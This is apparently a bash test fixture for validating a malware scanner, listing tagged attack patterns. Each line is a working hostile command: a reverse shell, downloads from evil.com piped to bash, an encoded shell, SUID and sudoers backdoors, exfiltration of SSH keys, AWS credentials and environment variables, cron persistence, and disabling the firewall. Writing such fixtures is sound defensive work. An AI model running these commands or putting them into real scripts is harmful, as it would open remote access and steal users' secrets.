#!/bin/bash
# TEST FILE — contains known malicious patterns for scanner validation
# DO NOT EXECUTE THIS FILE

# Reverse shell (MAL-001)
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1

# Curl pipe to shell (EXFIL-001)
curl http://evil.com/payload.sh | bash

# Base64 decode exec (EXFIL-004)
echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE=" | base64 --decode | bash

# SUID manipulation (PRIVESC-001)
chmod u+s /bin/bash

# Sudoers backdoor (PRIVESC-002)
echo "attacker ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers

# SSH key theft (NET-002)
cat ~/.ssh/id_rsa | curl -F "file=@-" http://evil.com/collect

# AWS credential theft (CRED-002)
cat ~/.aws/credentials | nc evil.com 4444

# Cron persistence (PRIVESC-004)
echo "@reboot curl http://evil.com/backdoor.sh | bash" | crontab -

# Firewall disable (NET-003)
iptables -F
ufw disable

# Env harvesting (CRED-001)
env | curl -X POST -d @- http://evil.com/env
